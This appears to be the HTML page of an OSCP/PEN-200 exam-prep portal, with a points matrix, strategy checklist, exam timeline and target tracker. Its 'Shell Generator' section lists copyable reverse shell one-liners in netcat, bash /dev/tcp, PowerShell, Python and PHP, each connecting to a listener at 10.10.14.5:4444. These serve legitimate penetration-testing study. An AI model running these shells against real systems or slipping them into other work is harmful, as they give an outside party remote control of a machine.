@@ -1,0 +1,377 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0">
+  <title>OSCP Prep Portal & Exam Guide</title>
+  <!-- Google Fonts -->
+  <link rel="preconnect" href="https://fonts.googleapis.com">
+  <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
+  <link href="https://fonts.googleapis.com/css2?family=Fira+Code:wght@400;500;600&family=Inter:wght@300;400;500;600;700&family=Outfit:wght@400;500;600;700;800&display=swap" rel="stylesheet">
+  <!-- Stylesheet -->
+  <link rel="stylesheet" href="style.css">
+  <!-- FontAwesome for Cyber Icons -->
+  <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css">
+</head>
+<body>
+  
+  <!-- Cyber Background Animations -->
+  <div class="cyber-bg">
+    <div class="grid-overlay"></div>
+    <div class="glow-orb orb-1"></div>
+    <div class="glow-orb orb-2"></div>
+    <div class="glow-orb orb-3"></div>
+  </div>
+
+  <div class="app-container">
+    
+    <!-- Sidebar Navigation -->
+    <aside class="sidebar">
+      <div class="brand">
+        <div class="logo-box">
+          <i class="fa-solid fa-terminal logo-icon"></i>
+        </div>
+        <div class="brand-text">
+          <h1>ANTIGRAVITY</h1>
+          <span>OSCP GUIDE v1.0</span>
+        </div>
+      </div>
+
+      <nav class="nav-links">
+        <button class="nav-btn active" data-tab="dashboard">
+          <i class="fa-solid fa-gauge-high"></i>
+          <span>Dashboard</span>
+        </button>
+        <button class="nav-btn" data-tab="knowledge">
+          <i class="fa-solid fa-book-open"></i>
+          <span>Syllabus Topics</span>
+        </button>
+        <button class="nav-btn" data-tab="timeline">
+          <i class="fa-solid fa-clock-rotate-left"></i>
+          <span>Exam Moments</span>
+        </button>
+        <button class="nav-btn" data-tab="generator">
+          <i class="fa-solid fa-network-wired"></i>
+          <span>Shell Generator</span>
+        </button>
+        <button class="nav-btn" data-tab="tracker">
+          <i class="fa-solid fa-square-check"></i>
+          <span>Exam Day Tracker</span>
+        </button>
+      </nav>
+
+      <div class="progress-widget">
+        <div class="progress-info">
+          <span>Overall Mastery</span>
+          <span id="mastery-percent">0%</span>
+        </div>
+        <div class="progress-bar-container">
+          <div class="progress-bar-fill" id="mastery-bar"></div>
+        </div>
+      </div>
+    </aside>
+
+    <!-- Main Content Area -->
+    <main class="main-content">
+      
+      <!-- Top header bar -->
+      <header class="content-header">
+        <div class="header-left">
+          <h2 id="current-view-title">Dashboard Overview</h2>
+          <p id="current-view-subtitle">Interactive tracker and statistics for your PEN-200 / OSCP prep.</p>
+        </div>
+        <div class="header-right">
+          <div class="cyber-time" id="clock">10:54:00</div>
+          <button id="reset-data" class="action-btn-danger" title="Reset all progress indicators">
+            <i class="fa-solid fa-trash-can"></i> Reset Progress
+          </button>
+        </div>
+      </header>
+
+      <!-- View Containers -->
+      <section class="view-section active" id="view-dashboard">
+        <!-- Statistics Widgets -->
+        <div class="stats-grid">
+          <div class="stat-card glass-card">
+            <div class="stat-icon-wrapper blue-glow">
+              <i class="fa-solid fa-circle-nodes"></i>
+            </div>
+            <div class="stat-data">
+              <span class="stat-value" id="stats-total-topics">0 / 0</span>
+              <span class="stat-label">Syllabus Subtopics Mastered</span>
+            </div>
+          </div>
+          
+          <div class="stat-card glass-card">
+            <div class="stat-icon-wrapper teal-glow">
+              <i class="fa-solid fa-clock"></i>
+            </div>
+            <div class="stat-data">
+              <span class="stat-value" id="stats-total-moments">0 / 0</span>
+              <span class="stat-label">Exam Guide Moments Reviewed</span>
+            </div>
+          </div>
+
+          <div class="stat-card glass-card">
+            <div class="stat-icon-wrapper purple-glow">
+              <i class="fa-solid fa-trophy"></i>
+            </div>
+            <div class="stat-data">
+              <span class="stat-value" id="stats-completion-badge">NOVICE</span>
+              <span class="stat-label">Certification Readiness State</span>
+            </div>
+          </div>
+        </div>
+
+        <!-- Dashboard Layout columns -->
+        <div class="dashboard-columns">
+          
+          <div class="column-left glass-card">
+            <h3><i class="fa-solid fa-circle-info text-blue"></i> Quick Strategy Checklist</h3>
+            <ul class="strategy-list">
+              <li>
+                <label class="custom-checkbox">
+                  <input type="checkbox" id="strat-1">
+                  <span class="checkmark"></span>
+                  <span>Complete the lab exercise reports (+10 bonus points buffer).</span>
+                </label>
+              </li>
+              <li>
+                <label class="custom-checkbox">
+                  <input type="checkbox" id="strat-2">
+                  <span class="checkmark"></span>
+                  <span>Practice the Active Directory sets (worth 40 crucial points).</span>
+                </label>
+              </li>
+              <li>
+                <label class="custom-checkbox">
+                  <input type="checkbox" id="strat-3">
+                  <span class="checkmark"></span>
+                  <span>Ensure LinPEAS, WinPEAS, and Mimikatz files are compiled and ready on Kali.</span>
+                </label>
+              </li>
+              <li>
+                <label class="custom-checkbox">
+                  <input type="checkbox" id="strat-4">
+                  <span class="checkmark"></span>
+                  <span>Download and format the official OffSec Markdown Report Template.</span>
+                </label>
+              </li>
+              <li>
+                <label class="custom-checkbox">
+                  <input type="checkbox" id="strat-5">
+                  <span class="checkmark"></span>
+                  <span>Establish the 2-hour rule (if stuck for 2 hours, take a break and switch targets).</span>
+                </label>
+              </li>
+            </ul>
+          </div>
+
+          <div class="column-right glass-card">
+            <h3><i class="fa-solid fa-shield-halved text-purple"></i> Point Matrix Reference</h3>
+            <table class="points-table">
+              <thead>
+                <tr>
+                  <th>Target Type</th>
+                  <th>Points</th>
+                  <th>Passing Criteria Requirements</th>
+                </tr>
+              </thead>
+              <tbody>
+                <tr>
+                  <td class="text-teal font-bold">Active Directory Set</td>
+                  <td>40 pts</td>
+                  <td>Must compromise Domain Controller (all-or-nothing).</td>
+                </tr>
+                <tr>
+                  <td class="text-blue">Standalone Box 1</td>
+                  <td>20 pts</td>
+                  <td>10 pts for user foothold, 10 pts for admin root.</td>
+                </tr>
+                <tr>
+                  <td class="text-blue">Standalone Box 2</td>
+                  <td>20 pts</td>
+                  <td>10 pts for user foothold, 10 pts for admin root.</td>
+                </tr>
+                <tr>
+                  <td class="text-blue">Standalone Box 3</td>
+                  <td>20 pts</td>
+                  <td>10 pts for user foothold, 10 pts for admin root.</td>
+                </tr>
+                <tr class="highlight-row">
+                  <td class="text-purple">Bonus Points</td>
+                  <td>10 pts</td>
+                  <td>Completed exercises + 30 flags in PG/Labs.</td>
+                </tr>
+              </tbody>
+            </table>
+            <div class="points-disclaimer">
+              <i class="fa-solid fa-triangle-exclamation"></i> <strong>Passing Score:</strong> 70 points minimum. If you get AD (40) + 1 Standalone Root (20) + Bonus Points (10), you pass!
+            </div>
+          </div>
+
+        </div>
+      </section>
+
+      <!-- Knowledge Base Section -->
+      <section class="view-section" id="view-knowledge">
+        <div class="search-filter-bar">
+          <div class="search-input-wrapper">
+            <i class="fa-solid fa-magnifying-glass search-icon"></i>
+            <input type="text" id="knowledge-search" placeholder="Search commands, techniques, explanations (e.g., nmap, sqlmap, bloodhound)...">
+          </div>
+          <div class="category-selectors" id="category-filters">
+            <!-- Dynamically populated -->
+          </div>
+        </div>
+
+        <div id="knowledge-container" class="knowledge-grid">
+          <!-- Dynamic topic grids populated via JS -->
+        </div>
+      </section>
+
+      <!-- Exam Moments Timeline Section -->
+      <section class="view-section" id="view-timeline">
+        <div class="timeline-intro">
+          <p>The OSCP exam is a 23-hour and 45-minute marathon. Managing your time, physical stamina, and scan schedules is the key differentiator between passing and failing. Use this guided timeline to check off your milestones.</p>
+        </div>
+        <div class="timeline-container" id="timeline-flow">
+          <!-- Dynamic timeline milestones populated via JS -->
+        </div>
+      </section>
+
+      <!-- Reverse Shell & command Builder Section -->
+      <section class="view-section" id="view-generator">
+        <div class="shell-builder-grid">
+          
+          <div class="builder-inputs glass-card">
+            <h3><i class="fa-solid fa-sliders text-teal"></i> Connection Parameters</h3>
+            <p class="section-desc">Enter your Kali environment listener settings to instantly adapt reverse shell codes.</p>
+            
+            <div class="form-group">
+              <label for="lhost">LHOST (Local Attacking IP)</label>
+              <input type="text" id="lhost" value="10.10.14.5" placeholder="e.g. 10.10.14.5">
+            </div>
+
+            <div class="form-group">
+              <label for="lport">LPORT (Listener Port)</label>
+              <input type="number" id="lport" value="4444" placeholder="e.g. 4444">
+            </div>
+
+            <div class="shell-options">
+              <h4>Useful Port Selection Tips:</h4>
+              <ul class="bullet-list-small">
+                <li>Use port <strong>443</strong> or <strong>80</strong> if you suspect egress firewall filtering on the target network.</li>
+                <li>Ensure netcat is listening on Kali: <code class="inline-code">nc -lvnp &lt;LPORT&gt;</code> before triggering execution.</li>
+              </ul>
+            </div>
+          </div>
+
+          <div class="builder-outputs">
+            <!-- Outputs populated dynamically via JavaScript -->
+            <div class="shell-card glass-card">
+              <div class="shell-card-header">
+                <h4><i class="fa-solid fa-square-terminal text-blue"></i> Netcat Reverse Shells</h4>
+                <button class="copy-shell-btn" data-target="nc-code"><i class="fa-regular fa-copy"></i> Copy</button>
+              </div>
+              <pre><code class="language-bash" id="nc-code">nc -e /bin/bash 10.10.14.5 4444</code></pre>
+            </div>
+
+            <div class="shell-card glass-card">
+              <div class="shell-card-header">
+                <h4><i class="fa-brands fa-linux text-teal"></i> Bash One-Liners</h4>
+                <button class="copy-shell-btn" data-target="bash-code"><i class="fa-regular fa-copy"></i> Copy</button>
+              </div>
+              <pre><code class="language-bash" id="bash-code">bash -i >& /dev/tcp/10.10.14.5/4444 0>&1</code></pre>
+            </div>
+
+            <div class="shell-card glass-card">
+              <div class="shell-card-header">
+                <h4><i class="fa-brands fa-windows text-purple"></i> PowerShell Command</h4>
+                <button class="copy-shell-btn" data-target="powershell-code"><i class="fa-regular fa-copy"></i> Copy</button>
+              </div>
+              <pre><code class="language-powershell" id="powershell-code">powershell -NoP -NonI -W Hidden -Exec Bypass -Command New-Object System.Net.Sockets.TCPClient("10.10.14.5",4444)</code></pre>
+            </div>
+
+            <div class="shell-card glass-card">
+              <div class="shell-card-header">
+                <h4><i class="fa-brands fa-python text-blue"></i> Python Reverse Shell</h4>
+                <button class="copy-shell-btn" data-target="python-code"><i class="fa-regular fa-copy"></i> Copy</button>
+              </div>
+              <pre><code class="language-python" id="python-code">python3 -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("10.10.14.5",4444));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);import pty;pty.spawn("/bin/bash")'</code></pre>
+            </div>
+
+            <div class="shell-card glass-card">
+              <div class="shell-card-header">
+                <h4><i class="fa-brands fa-php text-teal"></i> PHP One-Liner</h4>
+                <button class="copy-shell-btn" data-target="php-code"><i class="fa-regular fa-copy"></i> Copy</button>
+              </div>
+              <pre><code class="language-php" id="php-code">php -r '$sock=fsockopen("10.10.14.5",4444);exec("/bin/sh -i &lt;&amp;3 &gt;&amp;3 2&gt;&amp;3");'</code></pre>
+            </div>
+          </div>
+
+        </div>
+      </section>
+
+      <!-- Exam Day Target Tracker Section -->
+      <section class="view-section" id="view-tracker">
+        <div class="tracker-intro">
+          <p>Use this real-time tracker during your actual exam session. Keep track of compromised boxes, flags submitted, and verification screenshots taken. <strong>All data stays locally in your browser.</strong></p>
+        </div>
+        
+        <div class="tracker-grid">
+          
+          <div class="tracker-sidebar glass-card">
+            <h3><i class="fa-solid fa-bullseye text-red"></i> Session Score Counter</h3>
+            <div class="score-display">
+              <span class="score-number" id="live-score">0</span>
+              <span class="score-label">Points Secured</span>
+            </div>
+            <div class="score-bar-bg">
+              <div class="score-bar-fill" id="live-score-bar"></div>
+            </div>
+            <div class="score-status text-center" id="live-score-status">
+              70 Points Required to Pass
+            </div>
+          </div>
+
+          <div class="tracker-content glass-card">
+            <div class="tracker-header-controls">
+              <h3><i class="fa-solid fa-list-check text-blue"></i> Target Machine Checklist</h3>
+              <button class="action-btn" id="add-target-btn"><i class="fa-solid fa-plus"></i> Add Custom Machine</button>
+            </div>
+
+            <div class="table-container">
+              <table class="tracker-table" id="exam-tracker-table">
+                <thead>
+                  <tr>
+                    <th>Machine Name</th>
+                    <th>Type</th>
+                    <th>User Foothold</th>
+                    <th>Root / System</th>
+                    <th>Screenshot Taken</th>
+                    <th>Flags Verified</th>
+                    <th>Actions</th>
+                  </tr>
+                </thead>
+                <tbody id="tracker-tbody">
+                  <!-- Generated dynamically via JS -->
+                </tbody>
+              </table>
+            </div>
+          </div>
+
+        </div>
+      </section>
+
+    </main>
+  </div>
+
+  <!-- Notification Banner -->
+  <div id="toast" class="toast-notification">Copied to clipboard!</div>
+
+  <!-- Scripts -->
+  <script src="data.js"></script>
+  <script src="app.js"></script>
+</body>
+</html>
